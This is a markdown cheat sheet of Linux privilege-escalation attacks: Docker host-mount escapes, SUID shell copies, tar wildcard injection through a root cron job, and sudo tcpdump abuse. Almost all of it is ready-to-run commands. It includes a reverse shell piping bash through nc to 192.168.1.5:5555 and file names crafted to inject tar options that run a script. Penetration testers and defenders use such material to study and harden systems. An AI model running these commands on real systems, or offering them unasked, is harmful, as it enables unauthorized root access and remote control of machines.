# Linux Privilege Escalation

## Docker Privilege Escalation
```shell
# Creates a root SUID sh executable on the host that will give us root shell
docker run -t -v $PWD:/root ubuntu /bin/sh -c "cp /bin/sh /root/ && chown root.root /root/sh && chmod a+s /root/sh"

# Spawns a root shell on the host
docker run -v /:/root -i -t 8cedef9d7368 chroot /root
```

## SUID Privilege Escalation
```shell
# Creates a SUID binary that is a copy of bash owned by root. Last command spawns the root shell
cp /bin/bash /tmp/shell && chown root.root /tmp/shell && chmod 6755 /tmp/shell; /tmp/shell -p
```

## Wildcard Injection Privilege Escalation
In this example, a cronjob is running that creates a backup tar.gz file compressing all the files under a directory. Naming the files as tar command line arguments will run the rshell.sh script and give root shell access.

```text
## /etc/crontab entry
*/5 * * * * root /usr/bin/compress.sh

## /usr/bin/compress.sh file
#!/bin/sh
rm -f /home/test/backup/backup.tar.gz
cd /home/test/backup
tar cfz /home/test/backup *
chown test:test /home/test/backup/backup.tar.gz
rm -f /home/test/backup/*.BA
```

```shell
touch ./'--checkpoint-action=exec=bash rshell.sh'
touch ./'--checkpoint=1'
echo 'cd /tmp;mknod mypip p; /bin/bash 0< /tmp/mypip | nc 192.168.1.5 5555 1> /tmp/mypip' > ./rshell.sh && chmod 755 ./rshell.sh
```

## TCPDump Privilege Escalation
In this example, a user has sudo access to execute tcpdump without asking for a password.

```shell
echo 'cp /bin/bash /tmp/bash && chown root.root /tmp/bash && chmod +s /tmp/bash' > /tmp/shell.sh; chmod 755 /tmp/shell.sh
sudo tcpdump -W 1 -w /dev/null -G 1 -z /tmp/shell.sh -Z root
/tmp/bash -p
```